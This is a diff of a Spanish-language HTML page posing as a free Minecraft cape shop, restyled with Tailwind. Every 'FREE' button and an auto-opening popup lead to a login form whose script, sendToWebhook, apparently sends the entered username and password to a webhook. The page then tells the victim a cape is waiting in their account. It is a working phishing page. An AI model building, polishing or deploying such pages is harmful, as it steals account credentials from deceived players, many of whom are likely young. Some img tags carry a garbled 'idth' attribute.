@@ -1,103 +1,27 @@
-<!DOCTYPE html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venta de Capas de Minecraft</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(45deg, #1a1a1a, #333);
-            color: white;
-            margin: 0;
-            padding: 0;
-            text-align: center;
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Venta de Capas de Minecraft
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   body {
+            font-family: 'Arial', sans-serif;
         }
-        .header {
-            background: linear-gradient(45deg, #ff0000, #ff7300, #ffeb00, #00ff00, #008cff, #7a00ff);
-            padding: 15px;
-            font-size: 28px;
-            font-weight: bold;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
-        }
-        .header button {
-            background: white;
-            color: black;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        .header button:hover {
-            background: #ffeb00;
-        }
-        .container {
-            max-width: 1100px;
-            margin: auto;
-            padding: 30px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 20px;
-        }
-        .cape {
-            background: #444;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.2);
-            width: 250px;
-            text-align: center;
-        }
-        .cape img {
-            width: 100%;
-            border-radius: 5px;
-        }
-        .free-button {
-            background: #00ff00;
-            color: black;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .free-button:hover {
-            background: #00cc00;
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #222;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.3);
-            width: 300px;
-        }
-        .popup input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: none;
-        }
-    </style>
-    <script>
-        function toggleRegister() {
-            document.getElementById('register-popup').style.display = 'block';
+  </style>
+  <script>
+   function toggleRegister() {
+            document.getElementById('register-popup').classList.toggle('hidden');
         }
         function closePopup(id) {
-            document.getElementById(id).style.display = 'none';
+            document.getElementById(id).classList.add('hidden');
         }
         window.onload = function() {
-            document.getElementById('free-popup').style.display = 'block';
+            document.getElementById('free-popup').classList.remove('hidden');
         }
         function sendToWebhook(event) {
             event.preventDefault();
@@ -111,52 +35,200 @@
             });
             
             closePopup('register-popup');
-            document.getElementById('success-popup').style.display = 'block';
+            document.getElementById('success-popup').classList.remove('hidden');
         }
-    </script>
-</head>
-<body>
-    <div class="header">
-        <span>Tienda de Capas de Minecraft</span>
-        <button onclick="toggleRegister()">Register</button>
+  </script>
+ </head>
+ <body class="bg-gray-900 text-white">
+  <header class="bg-gray-800 p-4 shadow-lg">
+   <div class="container mx-auto flex justify-between items-center">
+    <span class="text-2xl font-bold">
+     Tienda de Capas de Minecraft
+    </span>
+    <nav>
+     <ul class="flex space-x-4">
+      <li>
+       <a class="hover:text-yellow-400 transition" href="#">
+        Inicio
+       </a>
+      </li>
+      <li>
+       <a class="hover:text-yellow-400 transition" href="#">
+        Capas
+       </a>
+      </li>
+      <li>
+       <a class="hover:text-yellow-400 transition" href="#">
+        Contacto
+       </a>
+      </li>
+      <li>
+       <a class="hover:text-yellow-400 transition" href="#">
+        Sobre Nosotros
+       </a>
+      </li>
+     </ul>
+    </nav>
+    <button class="bg-yellow-500 text-black px-4 py-2 rounded font-bold hover:bg-yellow-400 transition" onclick="toggleRegister()">
+     Register
+    </button>
+   </div>
+  </header>
+  <section class="bg-gray-800 py-20">
+   <div class="container mx-auto text-center">
+    <h1 class="text-4xl font-bold mb-4">
+     Bienvenido a la Tienda de Capas de Minecraft
+    </h1>
+    <p class="text-lg mb-8">
+     Consigue las mejores capas para tu personaje de Minecraft. ¡Explora nuestra colección y elige tu favorita!
+    </p>
+    <button class="bg-yellow-500 text-black px-6 py-3 rounded font-bold hover:bg-yellow-400 transition" onclick="toggleRegister()">
+     Consigue una capa gratis
+    </button>
+   </div>
+  </section>
+  <section class="py-20">
+   <div class="container mx-auto">
+    <h2 class="text-3xl font-bold text-center mb-12">
+     Nuestra Colección
+    </h2>
+    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-8">
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 1" class="rounded mb-4" height="250" src="download (1).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 2" class="rounded mb-4" height="250" src="download (2).png"idth="250"/> 
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 3" class="rounded mb-4" height="250" src="download (3).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 4" class="rounded mb-4" height="250" src="download (4).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 5" class="rounded mb-4" height="250" src="download (5).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 6" class="rounded mb-4" height="250" src="download (9).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 7" class="rounded mb-4" height="250" src="download (12).png"idth="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
+     <div class="cape bg-gray-700 p-4 rounded-lg shadow-lg text-center">
+      <img alt="Imagen de una capa de Minecraft con diseño 8" class="rounded mb-4" height="250" src="download (10).png" width="250"/>
+      <p class="mb-4">
+       FREE
+      </p>
+      <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister()">
+       FREE
+      </button>
+     </div>
     </div>
-    
-    <div id="free-popup" class="popup">
-        <h2>¡Llévate una capa gratis!</h2>
-        <button class="free-button" onclick="toggleRegister(); closePopup('free-popup');">Conseguir ahora</button>
+   </div>
+  </section>
+  <footer class="bg-gray-800 py-8">
+   <div class="container mx-auto text-center">
+    <p>
+     © 2023 Tienda de Capas de Minecraft. Todos los derechos reservados.
+    </p>
+    <div class="flex justify-center space-x-4 mt-4">
+     <a class="hover:text-yellow-400 transition" href="#">
+      <i class="fab fa-facebook-f">
+      </i>
+     </a>
+     <a class="hover:text-yellow-400 transition" href="#">
+      <i class="fab fa-twitter">
+      </i>
+     </a>
+     <a class="hover:text-yellow-400 transition" href="#">
+      <i class="fab fa-instagram">
+      </i>
+     </a>
+     <a class="hover:text-yellow-400 transition" href="#">
+      <i class="fab fa-linkedin-in">
+      </i>
+     </a>
     </div>
-    
-    <div id="register-popup" class="popup">
-        <h2>Registro</h2>
-        <form onsubmit="sendToWebhook(event)">
-            <input id="username" type="text" placeholder="Usuario" required>
-            <input id="password" type="password" placeholder="Contraseña" required>
-            <button type="submit" class="free-button">Registrarse</button>
-        </form>
-        <button onclick="closePopup('register-popup')">Cerrar</button>
-    </div>
-    
-    <div id="success-popup" class="popup">
-        <h2>LA CAPA YA ESTÁ ESPERANDO EN TU CUENTA...</h2>
-        <button onclick="closePopup('success-popup')">Cerrar</button>
-    </div>
-    
-    <div class="container">
-        <div class="cape">
-            <img src="capa1.png" alt="Capa Gratis">
-            <p>FREE</p>
-            <button class="free-button" onclick="toggleRegister()">FREE</button>
-        </div>
-        <div class="cape">
-            <img src="capa2.png" alt="Capa Gratis">
-            <p>FREE</p>
-            <button class="free-button" onclick="toggleRegister()">FREE</button>
-        </div>
-        <div class="cape">
-            <img src="capa3.png" alt="Capa Gratis">
-            <p>FREE</p>
-            <button class="free-button" onclick="toggleRegister()">FREE</button>
-        </div>
-    </div>
-</body>
+   </div>
+  </footer>
+  <div class="popup fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden" id="free-popup">
+   <div class="bg-gray-800 p-6 rounded-lg shadow-lg text-center">
+    <h2 class="text-2xl mb-4">
+     ¡Llévate una capa gratis!
+    </h2>
+    <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" onclick="toggleRegister(); closePopup('free-popup');">
+     Conseguir ahora
+    </button>
+   </div>
+  </div>
+  <div class="popup fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden" id="register-popup">
+   <div class="bg-gray-800 p-6 rounded-lg shadow-lg text-center">
+    <h2 class="text-2xl mb-4">
+     Registro
+    </h2>
+    <form onsubmit="sendToWebhook(event)">
+     <input class="w-full p-2 mb-4 rounded bg-gray-700 text-white" id="username" placeholder="Usuario" required="" type="text"/>
+     <input class="w-full p-2 mb-4 rounded bg-gray-700 text-white" id="password" placeholder="Contraseña" required="" type="password"/>
+     <button class="bg-green-500 text-black px-4 py-2 rounded font-bold hover:bg-green-400 transition" type="submit">
+      Registrarse
+     </button>
+    </form>
+    <button class="mt-4 text-red-500" onclick="closePopup('register-popup')">
+     Cerrar
+    </button>
+   </div>
+  </div>
+  <div class="popup fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden" id="success-popup">
+   <div class="bg-gray-800 p-6 rounded-lg shadow-lg text-center">
+    <h2 class="text-2xl mb-4">
+     LA CAPA YA ESTÁ ESPERANDO EN TU CUENTA...
+    </h2>
+    <button class="bg-red-500 text-black px-4 py-2 rounded font-bold hover:bg-red-400 transition" onclick="closePopup('success-popup')">
+     Cerrar
+    </button>
+   </div>
+  </div>
+ </body>
 </html>
